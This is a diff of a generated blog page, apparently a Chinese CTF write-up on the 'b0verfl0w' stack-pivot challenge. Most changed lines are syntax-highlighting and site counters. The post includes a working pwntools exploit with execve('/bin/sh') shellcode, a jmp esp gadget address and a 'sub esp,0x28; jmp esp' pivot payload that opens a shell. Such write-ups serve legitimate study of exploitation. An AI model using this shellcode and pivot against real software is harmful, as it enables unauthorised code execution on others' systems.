@@ -435,7 +435,7 @@
                 
                   <span class="post-meta-item-text">Symbols count in article: </span>
                 
-                <span title="Symbols count in article">1k</span>
+                <span title="Symbols count in article">1.1k</span>
               
 
               
@@ -475,9 +475,9 @@
 <p>第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。</p>
 <p><code>ROPgadget --binary b0verfl0w --only &#39;jmp|ret&#39;</code></p>
 <p>size(shellcode+padding)=0x20<br>size(fake ebp)=0x4<br>size(0x08048504)=0x4<br>所以我们最后一段需要执行的指令就是</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">sub</span> <span class="number">0x28</span>,<span class="built_in">esp</span></div><div class="line"><span class="keyword">jmp</span> <span class="built_in">esp</span></div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sub 0x28,esp</div><div class="line">jmp esp</div></pre></td></tr></table></figure>
 <p>Memory layout:<br>| Shellcode | Offset | 0x08048504 | Shellcode to perform stack pivoting | </p>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">sh = process('./b0verfl0w')</div><div class="line">shellcode = "<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>50<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>6e<span class="symbol">\x</span>89<span class="symbol">\x</span>e3<span class="symbol">\x</span>50<span class="symbol">\x</span>53<span class="symbol">\x</span>89<span class="symbol">\x</span>e1<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b<span class="symbol">\x</span>cd<span class="symbol">\x</span>80";</div><div class="line">padding = 'a'*13</div><div class="line">jmp_esp = 0x08048504</div><div class="line">sub_esp_jmp = asm('sub esp,0x28;jmp esp')</div><div class="line">payload = shellcode+padding+p32(jmp_esp)+sub_esp_jmp</div><div class="line">sh.sendline(payload)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">sh = process(&apos;./b0verfl0w&apos;)</div><div class="line">shellcode = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;</div><div class="line">padding = &apos;a&apos;*13</div><div class="line">jmp_esp = 0x08048504</div><div class="line">sub_esp_jmp = asm(&apos;sub esp,0x28;jmp esp&apos;)</div><div class="line">payload = shellcode+padding+p32(jmp_esp)+sub_esp_jmp</div><div class="line">sh.sendline(payload)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure>
 <p>我不明白既然有了 asm(‘sub esp,0x28;jmp esp’) 为什么还需要直接跳转到esp的gadgets。<br>解释：我们就可以借由jmp esp将执行流转移到栈上执行。而转移到栈上执行后，我们还需要对esp减上偏移(在返回地址时esp已经和ebp指向同一个地址)，使之转移到我们的buf中继续执行，而buf中我们事先就输入好了shellcode，那么我们在劫持完成后便可以获得一个shell</p>
 
       
@@ -599,7 +599,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">63</span>
+                    <span class="site-state-item-count">62</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -752,7 +752,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="Symbols count total">86k</span>
+    <span title="Symbols count total">88k</span>
   
 
   
@@ -761,7 +761,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="Reading time total">1:18</span>
+    <span title="Reading time total">1:20</span>
   
 </div>
 
